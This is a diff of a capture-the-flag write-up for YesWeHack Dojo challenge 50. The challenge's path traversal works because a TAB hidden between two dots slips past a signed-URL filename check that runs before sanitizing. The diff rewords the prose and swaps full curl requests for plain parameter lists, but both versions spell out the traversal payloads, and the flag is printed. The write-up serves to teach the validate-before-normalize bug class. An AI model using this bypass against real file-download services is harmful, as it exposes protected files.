@@ -1,4 +1,3 @@
-# YesWeHack-DOJO-CHALLENGE-50
 # 🧩 YWH-DOJO-50 Write-up — Public Object Alpha
 
 > **Category:** Web / File Read / Path Traversal  
@@ -70,7 +69,7 @@ This removes all ASCII control characters, including:
 
 ## 💥 Vulnerability
 
-The root issue is the **wrong order of operations**:
+The root issue is the wrong order of operations:
 
 ```text
 validate → sanitize → sign
@@ -82,18 +81,18 @@ Instead of the secure flow:
 sanitize → validate → sign
 ```
 
-This introduces a **canonicalization mismatch** between:
+This creates a **canonicalization mismatch** between:
 
 - the string being validated
 - the string actually signed
 
-This is a classic **validate-before-normalize bug**.
+This is a classic **validate-before-normalize** bug.
 
 ---
 
 ## ⚔️ Exploitation Strategy
 
-The bypass is to hide `..` using a **TAB character**.
+The bypass consists of hiding `..` using a **TAB character**.
 
 ### Signing payload
 
@@ -101,19 +100,19 @@ The bypass is to hide `..` using a **TAB character**.
 public/.<TAB>./super_secret.txt
 ```
 
-This visually becomes:
+Visual form:
 
 ```text
 public/.    ./super_secret.txt
 ```
 
-The filter checks only for the exact substring:
+Since the filter only checks the exact substring:
 
 ```text
 ..
 ```
 
-So the validation passes.
+the validation passes successfully.
 
 ---
 
@@ -137,57 +136,25 @@ The generated HMAC is therefore valid for the traversal path.
 
 ---
 
-## 💻 Step 1 — Generate Signature
+## 🧪 Steps to Reproduce
 
-```bash
-curl -X POST http://target/challenge.php \
-  -d "action=sign" \
-  --data-urlencode "filename=public/.%09./super_secret.txt"
-```
-
-### ✅ Expected Response
-
-```json
-{
-  "file": "public/.%09./super_secret.txt",
-  "expires": "1776081176",
-  "signature": "kcNo2kB79o7uyHNg3cwQrVTD2i5xxprQEWwkig0BugM="
-}
-```
-
----
-
-## 🖼️ Screenshot Placeholder — Signature Response
-
-> _Insert screenshot of the successful `sign` response here_
+### Step 1 — Generate Signature
 
 ```text
-[ screenshot_sign_response.png ]
+action=sign
+filename=public/.<TAB>./super_secret.txt
 ```
 
----
-
-## 📥 Step 2 — Download Secret File
-
-Now reuse the returned `signature` and `expires` with the normalized traversal path.
-
-```bash
-curl -X POST http://target/challenge.php \
-  -d "action=download" \
-  --data-urlencode "filename=public/../super_secret.txt" \
-  -d "expires=1776081176" \
-  --data-urlencode "signature=kcNo2kB79o7uyHNg3cwQrVTD2i5xxprQEWwkig0BugM="
-```
-
----
-
-## 🖼️ Screenshot Placeholder — Flag Retrieval
-
-> _Insert screenshot of the download response with the flag_
+### Step 2 — Download Secret File
 
 ```text
-[ screenshot_flag_retrieval.png ]
+action=download
+filename=public/../super_secret.txt
+expires=[value returned in step 1]
+signature=[value returned in step 1]
 ```
+
+> 📎 See attached screenshots/video for the full proof of concept.
 
 ---
 
@@ -197,9 +164,9 @@ curl -X POST http://target/challenge.php \
 D0n7_l3t_M3_c0n7tr0l_F1l3n4m3!!
 ```
 
-The flag itself hints directly at the core issue:
+The flag itself hints directly at the root cause:
 
-> Never let the user control unnormalized file paths.
+> Never let users control unnormalized file paths.
 
 ---
 
@@ -217,7 +184,7 @@ The exact bug class is:
 
 > **validate-before-normalize**
 
-This flaw is common in:
+This flaw commonly appears in:
 
 - signed URLs
 - CDN protected paths
@@ -261,7 +228,7 @@ This challenge is an excellent reminder of a core secure coding rule:
 
 > **Always normalize before validation**
 
-This concept is essential in:
+This principle is essential in:
 
 - Web Pentesting
 - Bug Bounty
@@ -277,4 +244,4 @@ A very elegant challenge that demonstrates how a tiny discrepancy in input handl
 
 The TAB injection trick is simple, realistic, and highly educational.
 
-A great example of how **string validation without canonicalization awareness leads to exploitable security flaws**.
+A great example of how string validation without canonicalization awareness leads to exploitable security flaws.
